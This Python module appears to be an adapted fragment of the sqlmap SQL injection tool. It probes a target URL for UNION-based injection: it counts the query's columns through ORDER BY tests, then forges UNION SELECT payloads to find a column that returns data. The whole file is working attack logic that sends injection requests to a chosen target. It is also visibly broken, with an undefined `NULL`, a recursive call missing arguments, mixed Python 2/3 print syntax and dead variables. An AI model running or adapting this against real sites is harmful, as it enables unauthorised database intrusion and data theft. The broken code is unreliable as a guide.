#!/usr/bin/env python
# -*- coding: utf-8 -*-
# DateTime    : 2019-07-29 17:46:59
# Author  : dongchuan
# Version : v1.0
# Desc     : 
import sys
import re
import random
from lib.config import conf
from lib.config import kb
from lib.utils.Agent import agent
from lib.utils.enums import PAYLOAD
from lib.request.queryPage import proxyqueryPage
from lib.utils.checks import checkComparison
from lib.utils.common import isNullValue,randomInt,removeReflectiveValues
from lib.utils.enums import ORDER_BY_STEP,UNION_MIN_RESPONSE_CHARS,FROM_DUMMY_TABLE
from lib.utils.enums import PAYLOAD_DELIMITER,LIMITED_ROWS_TEST_NUMBER
from lib.utils.unescaper import unescaper
from lib.utils.common import randomStr, Backend
from lib.utils.syntax import _escape


def _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix, paramDict, parameters):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 50 columns
    on the target database table
    """

    validPayload = None
    vector = None
    orderBy = kb.orderByColumns
    uChars = (conf.uChar, kb.uChar)

    # In case that user explicitly stated number of columns affected
    if conf.uColsStop == conf.uColsStart:
        count = conf.uColsStart
    else:
        count = _findUnionCharCount(comment, place, parameter, value, prefix, suffix, paramDict, parameters, PAYLOAD.WHERE.ORIGINAL if isNullValue(kb.uChar) else PAYLOAD.WHERE.NEGATIVE)
    if count:
        validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count, paramDict, parameters)

        if not all((validPayload, vector)) and not all((conf.uChar, conf.dbms)):
            warnMsg = "if UNION based SQL injection is not detected, "
            warnMsg += "please consider "

            if not conf.uChar and count > 1 and kb.uChar == NULL:
                    conf.uChar = kb.uChar = str(randomInt(2))
                    validPayload, vector = _unionConfirm(comment, place, parameter, prefix, suffix, count, paramDict, parameters)


        if orderBy is None and kb.orderByColumns is not None and not all((validPayload, vector)):  # discard ORDER BY results (not usable - e.g. maybe invalid altogether)
            conf.uChar, kb.uChar = uChars
            validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix)

    return validPayload, vector


def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, paramDict, parameters, where=PAYLOAD.WHERE.ORIGINAL):
    """
    Finds number of columns affected by UNION based injection
    """
    retVal = None

    def _orderByTechnique(lowerCount=None, upperCount=None):
        def _orderByTest(cols):
            query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
            query = agent.suffixQuery(query, suffix=suffix, comment=comment)
            payload = agent.payload_t(paramDict, parameters, place, parameter, newValue=query, where=where)

            url = "%s?%s" % (conf.url, payload)
            response = proxyqueryPage(url)
            page = response.getdata()
            code = response.getstatus()

            return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order (by|clause)", "unknown column", "failed"))  and checkComparison(page, kb.pageTemplate) or re.search(r"data types cannot be compared or sorted", page or "", re.I) is not None
        
        if _orderByTest(1 if lowerCount is None else lowerCount) and not _orderByTest(randomInt() if upperCount is None else upperCount + 1):
            # infoMsg = "'ORDER BY' technique appears to be usable. "
            # infoMsg += "This should reduce the time needed "
            # infoMsg += "to find the right number "
            # infoMsg += "of query columns. Automatically extending the "
            # infoMsg += "range for current UNION query injection technique test"
            # print (infoMsg)

            lowCols, highCols = 1 if lowerCount is None else lowerCount, ORDER_BY_STEP if upperCount is None else upperCount
            
            found = None
            while not found:
                if not conf.uCols and _orderByTest(highCols):
                    lowCols = highCols
                    highCols += ORDER_BY_STEP
                else:
                    while not found:
                        mid = highCols - (highCols - lowCols) // 2
                        if _orderByTest(mid):
                            lowCols = mid
                        else:
                            highCols = mid
                        if (highCols - lowCols) < 2:
                            found = lowCols
            return found

    try:
        # pushValue(kb.errorIsNone)
        items, ratios = [], []
        kb.errorIsNone = False
        lowerCount, upperCount = conf.uColsStart, conf.uColsStop

        if kb.orderByColumns is None and (lowerCount == 1 or conf.uCols):  # Note: ORDER BY is not bullet-proof
            found = _orderByTechnique(lowerCount, upperCount) if conf.uCols else _orderByTechnique()
            if found:
                kb.orderByColumns = found
                infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
                print(infoMsg)
                return found

    finally:
        pass
        # kb.errorIsNone = popValue()

    if retVal:
        infoMsg = "target URL appears to be UNION injectable with %d columns" % retVal
        print infoMsg

    return retVal


def unionTest(comment, place, parameter, value, prefix, suffix, paramDict, parameters):
    """
    This method tests if the target URL is affected by an union
    SQL injection vulnerability. The test is done up to 3*50 times
    """

    # if conf.direct:
    #     return

    # negativeLogic = kb.negativeLogic

    try:
        # if negativeLogic:
        #     pushValue(kb.negativeLogic)
        #     pushValue(conf.string)
        #     pushValue(conf.code)

        #     kb.negativeLogic = False
        #     conf.string = conf.code = None
        validPayload, vector = _unionTestByCharBruteforce(comment, place, parameter, value, prefix, suffix,paramDict, parameters)
    finally:
        pass
        # if negativeLogic:
        #     conf.code = popValue()
        #     conf.string = popValue()
        #     kb.negativeLogic = popValue()

    # if validPayload:
    #     validPayload = agent.removePayloadDelimiters(validPayload)

    return validPayload, vector


def _unionConfirm(comment, place, parameter, prefix, suffix, count, paramDict, parameters,):
    validPayload = None
    vector = None

    # Confirm the union SQL injection and get the exact column
    # position which can be used to extract data
    validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, paramDict, parameters,)

    # Assure that the above function found the exploitable full union
    # SQL injection position
    if not validPayload:
        validPayload, vector = _unionPosition(comment, place, parameter, prefix, suffix, count, paramDict, parameters, where=PAYLOAD.WHERE.NEGATIVE)

    return validPayload, vector


def _unionPosition(comment, place, parameter, prefix, suffix, count, paramDict, parameters, where=PAYLOAD.WHERE.ORIGINAL):
    validPayload = None
    vector = None

    positions = [_ for _ in xrange(0, count)]

    # Unbiased approach for searching appropriate usable column
    random.shuffle(positions)

    for charCount in (UNION_MIN_RESPONSE_CHARS << 2, UNION_MIN_RESPONSE_CHARS):
        if vector:
            break

        # For each column of the table (# of NULL) perform a request using
        # the UNION ALL SELECT statement to test it the target URL is
        # affected by an exploitable union SQL injection vulnerability
        for position in positions:
            # Prepare expression with delimiters
            randQuery = randomStr(charCount)
            phrase = ("%s%s%s" % (kb.chars.start, randQuery, kb.chars.stop)).lower()
            randQueryProcessed = agent.concatQuery("\'%s\'" % randQuery)
            randQueryUnescaped = _escape(randQueryProcessed)

            # Forge the union SQL injection request
            query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where)
            payload = agent.payload_t(paramDict, parameters, place, parameter, newValue=query, where=where)
            url = "%s?%s" % (conf.url, payload)
            response = proxyqueryPage(url)
            page = response.getdata()
            headers = response.getheaders()

            # Perform the request
            content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(str(headers if headers else None), payload, True) or "")).lower()
            if content and phrase in content:
                validPayload = payload
                kb.unionDuplicates = len(re.findall(phrase, content, re.I)) > 1
                vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, False)

                if where == PAYLOAD.WHERE.ORIGINAL:
                    # Prepare expression with delimiters
                    randQuery2 = randomStr(charCount)
                    phrase2 = ("%s%s%s" % (kb.chars.start, randQuery2, kb.chars.stop)).lower()
                    randQueryProcessed2 = agent.concatQuery("\'%s\'" % randQuery2)
                    randQueryUnescaped2 = _escape(randQueryProcessed2)

                    # Confirm that it is a full union SQL injection
                    query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, multipleUnions=randQueryUnescaped2)
                    payload = agent.payload_t(paramDict, parameters, place, parameter, newValue=query, where=where)
                    url = "%s?%s" % (conf.url, payload)
                    response = proxyqueryPage(url)
                    page = response.getdata()
                    headers = response.getheaders()
                    content = ("%s%s" % (page or "", str(headers if headers else None) or "")).lower()
                    
                    if not all(_ in content for _ in (phrase, phrase2)):
                        vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)
                    elif not kb.unionDuplicates:
                        fromTable = " FROM (%s) AS %s" % (" UNION ".join("SELECT %d%s%s" % (_, FROM_DUMMY_TABLE.get(Backend.getIdentifiedDbms(), ""), " AS %s" % randomStr() if _ == 0 else "") for _ in xrange(LIMITED_ROWS_TEST_NUMBER)), randomStr())
                        # Check for limited row output
                        query = agent.forgeUnionQuery(randQueryUnescaped, position, count, comment, prefix, suffix, kb.uChar, where, fromTable=fromTable)
                        payload = agent.payload_t(paramDict, parameters, place, parameter, newValue=query, where=where)
                        url = "%s?%s" % (conf.url, payload)
                        response = proxyqueryPage(url)
                        page = response.getdata()
                        headers = response.getheaders()

                        # Perform the request
                        content = ("%s%s" % (removeReflectiveValues(page, payload) or "", removeReflectiveValues(str(headers if headers else None), payload, True) or "")).lower()
                        if content.count(phrase) > 0 and content.count(phrase) < LIMITED_ROWS_TEST_NUMBER:
                            warnMsg = "output with limited number of rows detected. Switching to partial mode"
                            print (warnMsg)
                            vector = (position, count, comment, prefix, suffix, kb.uChar, where, kb.unionDuplicates, True)

                unionErrorCase = kb.errorIsNone

                if unionErrorCase and count > 1:
                    warnMsg = "combined UNION/error-based SQL injection case found on "
                    warnMsg += "column %d. sqlmap will try to find another " % (position + 1)
                    warnMsg += "column with better characteristics"
                    print(warnMsg)
                else:
                    break

    return validPayload, vector